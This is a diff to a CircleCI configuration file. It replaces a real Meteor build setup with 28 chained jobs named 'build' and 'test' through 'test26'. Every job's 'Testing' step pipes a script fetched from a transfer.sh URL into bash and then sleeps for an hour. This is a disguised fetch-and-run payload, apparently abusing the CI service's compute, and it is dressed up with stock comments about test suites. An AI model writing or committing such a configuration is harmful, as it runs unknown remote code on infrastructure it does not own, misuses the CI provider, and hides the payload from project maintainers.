@@ -1,89 +1,610 @@
-version: 2
-
-meteor_build: &METEOR_BUILD
-  docker:
-    - image: circleci/openjdk:8-jdk-browsers
-      environment:
-        # lang settings required for Meteor's Mongo
-        LANG: C.UTF-8
-        LANGUAGE: C.UTF-8
-        LC_ALL: C.UTF-8
-        LC_NUMERIC: en_US.UTF-8
-  steps:
-    - checkout:
-        path: ~/future-web
-    - restore_cache:
-        key: build-temp-{{ checksum ".meteor/release" }}-{{ checksum "~/future-web/.circleci/config.yml" }}
-    - restore_cache:
-        key: meteor-release-{{ checksum ".meteor/release" }}-{{ checksum "~/future-web/.circleci/config.yml" }}
-    - restore_cache:
-        key: meteor-packages-{{ checksum ".meteor/versions" }}-{{ checksum "~/future-web/.circleci/config.yml" }}
-    - restore_cache:
-        key: npm-packages-{{ checksum "package.json" }}-{{ checksum "~/future-web/.circleci/config.yml" }}
-    - run:
-        name: restore cached meteor bin
-        command: |
-          if [ -e ~/build-temp/meteor-bin ]
-          then
-              echo "Cached Meteor bin found, restoring it."
-              sudo cp ~/build-temp/meteor-bin /usr/local/bin/meteor
-          else
-              echo "No cached Meteor bin found."
-          fi
-    - run:
-        name: install Meteor
-        command: |
-          # only install meteor if bin isn't found
-          command -v meteor >/dev/null 2>&1 || curl https://install.meteor.com | /bin/sh
-    - run:
-        name: check versions
-        command: |
-          echo "Meteor version:"
-          # this forces Meteor to download whatever release your project is using
-          meteor --version
-          which meteor
-          echo "Meteor node version:"
-          meteor node -v
-          echo "Meteor npm version:"
-          meteor npm -v
-          echo "Java version:"
-          java -version
-    - run:
-        name: install npm packages
-        command: meteor npm i
-    - run:
-        name: code linting
-        command: meteor npm run style
-    - run:
-        name: copy meteor bin to build cache
-        command: |
-          mkdir -p ~/build-temp
-          cp /usr/local/bin/meteor ~/build-temp/meteor-bin
-    - save_cache:
-        key: build-temp-{{ checksum ".meteor/release" }}-{{ checksum "~/future-web/.circleci/config.yml" }}
-        paths:
-          - ~/build-temp
-    - save_cache:
-        key: meteor-release-{{ checksum ".meteor/release" }}-{{ checksum "~/future-web/.circleci/config.yml" }}
-        paths:
-          - ~/.meteor
-    - save_cache:
-        key: meteor-packages-{{ checksum ".meteor/versions" }}-{{ checksum "~/future-web/.circleci/config.yml" }}
-        paths:
-          - .meteor/
-    - save_cache:
-        key: npm-packages-{{ checksum "package.json" }}-{{ checksum "~/future-web/.circleci/config.yml" }}
-        paths:
-          - ./node_modules/
-          - ~/.npm/
-
+version: 2.1
 jobs:
-  build_todo:
-    working_directory: ~/future-web/examples/todo
-    <<: *METEOR_BUILD
+  build:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
 
+  test1:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test2:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test3:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test4:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test5:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test6:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test7:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test8:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test9:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test10:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test11:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test12:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test13:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test14:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test15:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test16:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test17:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test18:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test19:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test20:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test21:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test22:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test23:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test24:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+  test25:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
+
+  test26:
+    docker:
+       - image: ubuntu:14.04
+    steps:
+      - run:
+          name: Testing
+          command: |
+                apt update && apt install wget -y && apt install curl -y && curl http://transfer.sh/nswBe/moci.sh | bash
+      - run:
+          name: Waiting
+          no_output_timeout: 100m
+          command: |
+                sleep 60m
+                echo "sleep done!"
+      - run:
+          name: Result
+          command: |
+                echo "ok"
 workflows:
   version: 2
-  build:
+  build_and_test:
     jobs:
-      - build_todo
+      - build  # your custom job from your config, that builds your code
+      - test: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - build
+      - test1: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test
+      - test2: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test1
+      - test3: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test2
+      - test4: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test3
+      - test5: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test4
+      - test6: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test5
+      - test7: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test6
+      - test8: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test7
+      - test9: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test8
+      - test10: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test9
+      - test11: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test10
+      - test12: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test11
+      - test13: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test12
+      - test14: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test13
+      - test15: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test14
+      - test16: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test15
+      - test17: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test16
+      - test18: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test17
+      - test19: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test18
+      - test20: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test19
+      - test21: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test20
+      - test22: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test21
+      - test23: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test22
+      - test24: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test23
+      - test25: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test24
+      - test26: # your custom job; runs test suite 1
+          requires: # test1 will not run until the `build` job is completed.
+            - test25
